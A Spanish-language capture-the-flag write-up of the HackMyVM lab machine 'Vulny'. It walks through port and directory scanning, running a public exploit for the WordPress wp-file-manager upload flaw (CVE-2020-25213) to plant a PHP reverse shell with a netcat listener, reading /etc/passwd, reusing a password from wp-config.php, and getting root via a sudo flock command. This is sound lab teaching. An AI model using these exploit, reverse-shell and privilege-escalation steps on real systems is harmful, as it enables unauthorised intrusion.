---
layout: single
title: Vulny - HackMyVM
excerpt: "Vulny es una máquina Linux creada por sML. En esta máquina veremos como enumerar una web usando gobuster, buscar y usar un exploit para ganar el acceso al sistema, pasar de usuario www-data a usuario y para terminar elevaremos privilegios mediante un binario."
date: 2021-10-25
classes: wide
header:
  teaser: /assets/images/hmvm-Vulny/hmvmVulny.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - Fácil
tags:
  - hackmyvm
  - wordpress
  - cve
  - hidden file
  - reverse shell
  - sML
---

### Escaneo de puertos
```bash
nmap -p- -T5 --open -v -n -Pn 192.168.1.69

PORT      STATE SERVICE
80/tcp    open  http
33060/tcp open  mysqlx
```

### Escaneo de servicios
```bash
nmap -sCV -p 80,33060 192.168.1.69

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=10/25%Time=61768050%P=x86_64-pc-linux-gnu%r(
SF:NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPO
SF:ptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVer
SF:sionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,
SF:2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0f
SF:Invalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0";
```

### Gobuster
```bash
gobuster dir -u http://192.168.1.69 -w /opt/w/directory-list-2.3-medium.txt
===============================================================

/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.69/javascript/]
/secret               (Status: 301) [Size: 313] [--> http://192.168.1.69/secret/]    
/server-status        (Status: 403) [Size: 277]
```

### Directorio secret

![](/assets/images/hmvm-Vulny/webSecret.png)

Añado el directorio secret a gobuster para seguir con la enumeración.
```bash
gobuster dir -u http://192.168.1.69/secret -w /opt/w/directory-list-2.3-medium.txt 
===============================================================

/wp-content           (Status: 301) [Size: 324] [--> http://192.168.1.69/secret/wp-content/]
/wp-includes          (Status: 301) [Size: 325] [--> http://192.168.1.69/secret/wp-includes/]
/wp-admin             (Status: 301) [Size: 322] [--> http://192.168.1.69/secret/wp-admin/]
```

### Directorio wp-admin

![](/assets/images/hmvm-Vulny/webSecretWpadmin.png)

### Directorio wp-content

![](/assets/images/hmvm-Vulny/webSecretWpContent.png)

### Directorio wp-content/uploads/2020/10

![](/assets/images/hmvm-Vulny/webSecretWpConUploads2k20.png)

Al ver la versión del file-manager hago una búsqueda en exploitdb a ver si encuentro un exploit.

![](/assets/images/hmvm-Vulny/exploit.png)

Me descargo el exploit y lo lanzo para ver la ayuda.

![](/assets/images/hmvm-Vulny/exploitHelp.png)

Con la flag `-f` puedo subir un archivo, subiré una reverse_shell para conseguir acceso al sistema.

```bash
bash CVE-2020-25213.sh -u http://192.168.1.69/secret -f ~/pentest/HackMyVM/Easy/vulny/reverse_shell.php 

============================================================================================
wp-file-manager unauthenticated arbitrary file upload (RCE) Exploit [CVE-2020-25213]

By: Mansoor R (@time4ster)
============================================================================================

[+] W00t! W00t! File uploaded successfully.
Location:  /secret/wp-content/plugins/wp-file-manager/lib/php/../files/reverse_shell.php
```

Ahora dejo un listener a la escucha por el puerto 443.
```bash
nc -lvnp 443
```

Voy a la ruta donde se ha subido la reverse_shell y le doy click para obtener la shell.

![](/assets/images/hmvm-Vulny/rutaReverse.png)

### Tratamiento tty
```bash
script /dev/null -c bash
[control+z]
stty raw -echo;fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

Usando el archivo `/etc/passwd` enumero los usuarios del sistema.

```bash
www-data@vulny:/usr/share/wordpress$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
adrian:x:1000:1000:adrian:/home/adrian:/bin/bash
```

### User pivoting
Ahora me desplazo a `/usr/share/wordpress` y en el archivo `wp-config.php` encuentro lo siguiente:

![](/assets/images/hmvm-Vulny/idrink.png)

Parece una contraseña, la probaremos con el usuario adrian.

```bash
www-data@vulny:/usr/share/wordpress$ su adrian
Password: 
adrian@vulny:/usr/share/wordpress$ id
uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
adrian@vulny:/usr/share/wordpress$
```

Como adrian ya podemos leer la flag de user.
```bash
adrian@vulny:~$ cat user.txt 
HMV************
```

### Comprobación de comandos que puedo ejecutar con sudo

```bash
adrian@vulny:~$ sudo -l
Matching Defaults entries for adrian on vulny:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on vulny:
    (ALL : ALL) NOPASSWD: /usr/bin/flock
```

### GTFOBins
Hago una busqueda de flock en gtfobins y encuentro lo siguiente:

![](/assets/images/hmvm-Vulny/gtfobinsflock.png)

### Root
```bash
adrian@vulny:~$ sudo flock -u / /bin/sh
# id; whoami
uid=0(root) gid=0(root) groups=0(root)
root
```

Como root ya puedo leer la flag de root
```bash
# cat root.txt
HMV******
```
